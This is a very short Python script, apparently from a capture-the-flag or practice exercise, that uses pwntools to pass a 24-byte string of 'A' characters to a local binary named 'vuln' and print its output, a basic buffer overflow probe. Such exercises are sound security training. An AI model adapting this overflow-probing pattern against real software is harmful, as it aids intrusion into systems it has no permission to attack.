#!/usr/bin/env python

from pwn import *

payload = "A" * 24
r = process(["./vuln", payload])

print(r.recvall())
